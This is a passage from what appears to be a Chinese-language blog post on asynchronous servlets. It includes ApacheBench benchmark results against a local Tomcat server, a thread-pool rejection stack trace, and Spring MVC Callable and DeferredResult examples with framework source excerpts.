class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$ ab -n 10000 -c 200 http://localhost:8080/async</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking localhost (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        Apache-Coyote/1.1</span><br><span class="line">Server Hostname:        localhost</span><br><span class="line">Server Port:            8080</span><br><span class="line"></span><br><span class="line">Document Path:          /async</span><br><span class="line">Document Length:        40 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200</span><br><span class="line">Time taken for tests:   1000.284 seconds</span><br><span class="line">Complete requests:      10000</span><br><span class="line">Failed requests:        47</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 47, Exceptions: 0)</span><br><span class="line">Write errors:           0</span><br><span class="line">Non-2xx responses:      47</span><br><span class="line">Total transferred:      1530740 bytes</span><br><span class="line">HTML transferred:       506980 bytes</span><br><span class="line">Requests per second:    10.00 [#/sec] (mean)</span><br><span class="line">Time per request:       20005.686 [ms] (mean)</span><br><span class="line">Time per request:       100.028 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          1.49 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    0   5.0      0     501</span><br><span class="line">Processing:     2 19810 1683.3  20001   20560</span><br><span class="line">Waiting:        1 19810 1683.4  20000   20558</span><br><span class="line">Total:          2 19811 1683.0  20001   20560</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%  20001</span><br><span class="line">  66%  20001</span><br><span class="line">  75%  20002</span><br><span class="line">  80%  20002</span><br><span class="line">  90%  20004</span><br><span class="line">  95%  20009</span><br><span class="line">  98%  20020</span><br><span class="line">  99%  20035</span><br><span class="line"> 100%  20560 (longest request)</span><br></pre></td></tr></table></figure>
<p>测试过程中出的异常：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">一月 21, 2017 1:05:32 上午 org.apache.catalina.core.StandardWrapperValve invoke</span><br><span class="line">严重: Servlet.service() for servlet [com.air.async.AsyncServlet] in context with path [] threw exception</span><br><span class="line">java.util.concurrent.RejectedExecutionException: Task com.air.async.AsyncRequestProcessor@3caec762 rejected from java.util.concurrent.ThreadPoolExecutor@64db0f23[Running, pool size = 100, active threads = 100, queued tasks = 100, completed tasks = 9726]</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2048)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:821)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1372)</span><br><span class="line">  at com.air.async.AsyncServlet.doGet(AsyncServlet.java:25)</span><br><span class="line">  at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)</span><br><span class="line">  at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)</span><br><span class="line">  at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)</span><br><span class="line">  at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)</span><br><span class="line">  at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)</span><br><span class="line">  at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)</span><br><span class="line">  at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)</span><br><span class="line">  at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)</span><br><span class="line">  at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)</span><br><span class="line">  at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)</span><br><span class="line">  at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)</span><br><span class="line">  at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)</span><br><span class="line">  at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041)</span><br><span class="line">  at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:603)</span><br><span class="line">  at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2430)</span><br><span class="line">  at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2419)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">  at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>
<p>有47个失败的case，是队列满了，然后丢掉了请求。</p>
<h3 id="sync-ab测试"><a href="#sync-ab测试" class="headerlink" title="sync ab测试"></a>sync ab测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ ab -n 10000 -c 200 http://localhost:8080/hello</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking localhost (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        Apache-Coyote/1.1</span><br><span class="line">Server Hostname:        localhost</span><br><span class="line">Server Port:            8080</span><br><span class="line"></span><br><span class="line">Document Path:          /hello</span><br><span class="line">Document Length:        12 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200</span><br><span class="line">Time taken for tests:   2002.151 seconds</span><br><span class="line">Complete requests:      10000</span><br><span class="line">Failed requests:        0</span><br><span class="line">Write errors:           0</span><br><span class="line">Total transferred:      1340000 bytes</span><br><span class="line">HTML transferred:       120000 bytes</span><br><span class="line">Requests per second:    4.99 [#/sec] (mean)</span><br><span class="line">Time per request:       40043.028 [ms] (mean)</span><br><span class="line">Time per request:       200.215 [ms] (mean, across all concurrent requests)</span><br><span class="line">Transfer rate:          0.65 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        0    0   0.4      0       8</span><br><span class="line">Processing: 10002 39740 2686.3  40005   50319</span><br><span class="line">Waiting:    10002 39740 2686.4  40004   50319</span><br><span class="line">Total:      10002 39741 2686.3  40005   50319</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%  40005</span><br><span class="line">  66%  40009</span><br><span class="line">  75%  40014</span><br><span class="line">  80%  40022</span><br><span class="line">  90%  40122</span><br><span class="line">  95%  40316</span><br><span class="line">  98%  40449</span><br><span class="line">  99%  40483</span><br><span class="line"> 100%  50319 (longest request)</span><br></pre></td></tr></table></figure>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>异步的servle在高并发的情况下可以使用较少的连接线程实现较大的吞吐。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Puts this request into asynchronous mode, and initializes its</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@link</span> AsyncContext&#125; with the original (unwrapped) ServletRequest</span></span><br><span class="line"><span class="comment">    * and ServletResponse objects.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Calling this method will cause committal of the associated</span></span><br><span class="line"><span class="comment">    * response to be delayed until &#123;<span class="doctag">@link</span> AsyncContext#complete&#125; is</span></span><br><span class="line"><span class="comment">    * called on the returned &#123;<span class="doctag">@link</span> AsyncContext&#125;, or the asynchronous</span></span><br><span class="line"><span class="comment">    * operation has timed out.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Calling &#123;<span class="doctag">@link</span> AsyncContext#hasOriginalRequestAndResponse()&#125; on</span></span><br><span class="line"><span class="comment">    * the returned AsyncContext will return &lt;code&gt;true&lt;/code&gt;. Any filters</span></span><br><span class="line"><span class="comment">    * invoked in the &lt;i&gt;outbound&lt;/i&gt; direction after this request was put</span></span><br><span class="line"><span class="comment">    * into asynchronous mode may use this as an indication that any request</span></span><br><span class="line"><span class="comment">    * and/or response wrappers that they added during their &lt;i&gt;inbound&lt;/i&gt;</span></span><br><span class="line"><span class="comment">    * invocation need not stay around for the duration of the asynchronous</span></span><br><span class="line"><span class="comment">    * operation, and therefore any of their associated resources may be</span></span><br><span class="line"><span class="comment">    * released.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;This method clears the list of &#123;<span class="doctag">@link</span> AsyncListener&#125; instances</span></span><br><span class="line"><span class="comment">    * (if any) that were registered with the AsyncContext returned by the</span></span><br><span class="line"><span class="comment">    * previous call to one of the startAsync methods, after calling each</span></span><br><span class="line"><span class="comment">    * AsyncListener at its &#123;<span class="doctag">@link</span> AsyncListener#onStartAsync onStartAsync&#125;</span></span><br><span class="line"><span class="comment">    * method.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;Subsequent invocations of this method, or its overloaded </span></span><br><span class="line"><span class="comment">    * variant, will return the same AsyncContext instance, reinitialized</span></span><br><span class="line"><span class="comment">    * as appropriate.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> the (re)initialized AsyncContext</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalStateException if this request is within the scope of</span></span><br><span class="line"><span class="comment">    * a filter or servlet that does not support asynchronous operations</span></span><br><span class="line"><span class="comment">    * (that is, &#123;<span class="doctag">@link</span> #isAsyncSupported&#125; returns false),</span></span><br><span class="line"><span class="comment">    * or if this method is called again without any asynchronous dispatch</span></span><br><span class="line"><span class="comment">    * (resulting from one of the &#123;<span class="doctag">@link</span> AsyncContext#dispatch&#125; methods),</span></span><br><span class="line"><span class="comment">    * is called outside the scope of any such dispatch, or is called again</span></span><br><span class="line"><span class="comment">    * within the scope of the same dispatch, or if the response has</span></span><br><span class="line"><span class="comment">    * already been closed</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> AsyncContext#dispatch()</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@since</span> Servlet 3.0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> AsyncContext <span class="title">startAsync</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException</span>;</span><br></pre></td></tr></table></figure>
<p>//挖坑，待填</p>
<h2 id="Spring-对异步Servlet的支持"><a href="#Spring-对异步Servlet的支持" class="headerlink" title="Spring 对异步Servlet的支持"></a>Spring 对异步Servlet的支持</h2><p>web.xml中需要的配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring encoding filter--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--servlet--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">            classpath:spring/mvc/mvc-app.xml</span><br><span class="line">        <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果有filter的话也必须配置上异步的支持</p>
<h3 id="Callable-方式"><a href="#Callable-方式" class="headerlink" title="Callable 方式"></a>Callable 方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/async"</span>)</span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Callable&lt;String&gt; <span class="title">asyncProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方式返回一个<code>Callable</code>，Spring在线程池中执行<code>Callable</code>并获取到结果然后进行后续的处理。</p>
<p>TaskExecutor 自定义线程池：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ================================== --&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- 0. Set up task executor for async  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ================================== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:async-support</span> <span class="attr">default-timeout</span>=<span class="string">"30000"</span> <span class="attr">task-executor</span>=<span class="string">"taskExecutor"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- modify the parameters of thread pool --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"taskExecutor"</span> <span class="attr">class</span>=<span class="string">"org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"corePoolSize"</span> <span class="attr">value</span>=<span class="string">"5"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"50"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"queueCapacity"</span> <span class="attr">value</span>=<span class="string">"10"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"keepAliveSeconds"</span> <span class="attr">value</span>=<span class="string">"120"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="DeferredResult-方式"><a href="#DeferredResult-方式" class="headerlink" title="DeferredResult 方式"></a>DeferredResult 方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/asyncV2"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> DeferredResult&lt;String&gt; <span class="title">aysncProcess2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> DeferredResult&lt;String&gt; stringDeferredResult = <span class="keyword">new</span> DeferredResult&lt;&gt;();</span><br><span class="line">       MoreExecutors.directExecutor().execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">30000</span>);</span><br><span class="line">                   stringDeferredResult.setResult(<span class="string">"index"</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   stringDeferredResult.setErrorResult(<span class="string">"error"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="keyword">return</span> stringDeferredResult;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这种方式返回的是<code>DeferredResult</code>，计算的逻辑可以在业务线程池中计算，当计算完成后，</p>
<p>直接向<code>DeferredResult</code>中set数据即可，会触发后续的处理，并返回给客户端。</p>
<h3 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h3><p><code>RequestMappingHandlerAdapter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Invoke the &#123;<span class="doctag">@link</span> RequestMapping&#125; handler method preparing a &#123;<span class="doctag">@link</span> ModelAndView&#125;</span></span><br><span class="line"><span class="comment">   * if view resolution is required.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@since</span> 4.2</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@see</span> #createInvocableHandlerMethod(HandlerMethod)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">invokeHandlerMethod</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">      HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    ServletWebRequest webRequest = <span class="keyword">new</span> ServletWebRequest(request, response);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      WebDataBinderFactory binderFactory = getDataBinderFactory(handlerMethod);</span><br><span class="line">      ModelFactory modelFactory = getModelFactory(handlerMethod, binderFactory);</span><br><span class="line"></span><br><span class="line">      ServletInvocableHandlerMethod invocableMethod = createInvocableHandlerMethod(handlerMethod);</span><br><span class="line">      invocableMethod.setHandlerMethodArgumentResolvers(<span class="keyword">this</span>.argumentResolvers);</span><br><span class="line">      invocableMethod.setHandlerMethodReturnValueHandlers(<span class="keyword">this</span>.returnValueHandlers);</span><br><span class="line">      invocableMethod.setDataBinderFactory(binderFactory);</span><br><span class="line">      invocableMethod.setParameterNameDiscoverer(<span class="keyword">this</span>.parameterNameDiscoverer);</span><br><span class="line"></span><br><span class="line">      ModelAndViewContainer mavContainer = <span class="keyword">new</span> ModelAndViewContainer();</span><br><span class="line">      mavContainer.addAllAttributes(RequestContextUtils.getInputFlashMap(request));</span><br><span class="line">      modelFactory.initModel(webRequest, mavContainer, invocableMethod);</span><br><span class="line">      mavContainer.setIgnoreDefaultModelOnRedirect(<span class="keyword">this</span>.ignoreDefaultModelOnRedirect);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//创建异步请求</span></span><br><span class="line">      AsyncWebRequest asyncWebRequest = WebAsyncUtils.createAsyncWebRequest(request, response);</span><br><span class="line">      asyncWebRequest.setTimeout(<span class="keyword">this</span>.asyncRequestTimeout);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//下面的代码设置了Callable执行的线程池，以及拦截器还有DeferredResult的拦截器</span></span><br><span class="line">      WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">      asyncManager.setTaskExecutor(<span class="keyword">this</span>.taskExecutor);</span><br><span class="line">      asyncManager.setAsyncWebRequest(asyncWebRequest);</span><br><span class="line">      asyncManager.registerCallableInterceptors(<span class="keyword">this</span>.callableInterceptors);</span><br><span class="line">      asyncManager.registerDeferredResultInterceptors(<span class="keyword">this</span>.deferredResultInterceptors);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (asyncManager.hasConcurrentResult()) &#123;</span><br><span class="line">        Object result = asyncManager.getConcurrentResult();</span><br><span class="line">        mavContainer = (ModelAndViewContainer) asyncManager.getConcurrentResultContext()[<span class="number">0</span>];</span><br><span class="line">        asyncManager.clearConcurrentResult();</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Found concurrent result value ["</span> + result + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        invocableMethod = invocableMethod.wrapConcurrentResult(result);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      invocableMethod.invokeAndHandle(webRequest, mavContainer);</span><br><span class="line">      <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 